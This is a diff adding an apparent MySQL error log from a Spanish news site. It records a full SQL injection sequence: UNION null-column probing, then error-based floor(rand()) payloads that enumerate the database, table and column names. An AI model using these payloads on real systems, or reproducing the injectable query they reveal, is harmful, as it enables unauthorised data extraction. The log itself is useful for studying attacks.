@@ -1,0 +1,395 @@
+Time : 17:41:15
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'parrafo5'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 15,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:41:14
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'imagen5'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 14,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:41:13
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'parrafo4'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 13,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:41:10
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'parrafo3'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 11,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:41:09
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'imagen3'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 10,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:41:07
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'parrafo2'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 9,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:41:06
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'imagen4'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 12,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:41:05
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'titulo'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 5,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:41:03
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'imagen'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 6,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:41:02
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'imagen2'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 8,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:41:00
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'parrafo'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 7,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:40:58
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'ubicacion'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 4,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:40:57
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'ciudad'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 3,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:40:55
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'clasificacion'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 2,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:40:54
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'date'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 1,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:40:51
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'id'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 0,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:40:49
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'19'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,count(column_name),0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:39:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'opinion'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,table_name,0x27,0x7e) from `information_schema`.tables where table_schema=0x64656C6264 limit 1,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:39:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'noticias'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,table_name,0x27,0x7e) from `information_schema`.tables where table_schema=0x64656C6264 limit 0,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:39:34
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,unhex(Hex(cast(table_name as char))),0x27,0x7e) from `information_schema`.tables where table_schema=0x64656C6264 limit 0,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:39:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'2'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,count(table_name),0x27,0x7e) from `information_schema`.tables where table_schema=0x64656C6264)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:39:28
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(table_name) as char))),0x27,0x7e) from `information_schema`.tables where table_schema=0x64656C6264)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:39:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'2'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,count(table_name),0x27,0x7e) from `information_schema`.tables where table_schema=0x64656C6264)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:39:22
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e) from `information_schema`.schemata limit 0,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:38:59
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'delbd'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,unhex(Hex(cast(database() as char))),0x27,0x7e)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 17:38:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:44
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null,null--
+
+Time : 17:38:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null,null--
+
+Time : 17:38:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null,null--
+
+Time : 17:38:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null,null--
+
+Time : 17:38:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null,null--
+
+Time : 17:38:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null,null--
+
+Time : 17:38:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null,null--
+
+Time : 17:38:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null,null--
+
+Time : 17:38:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select null--
+
+Time : 17:38:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831 union all select--
+
+Time : 17:38:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
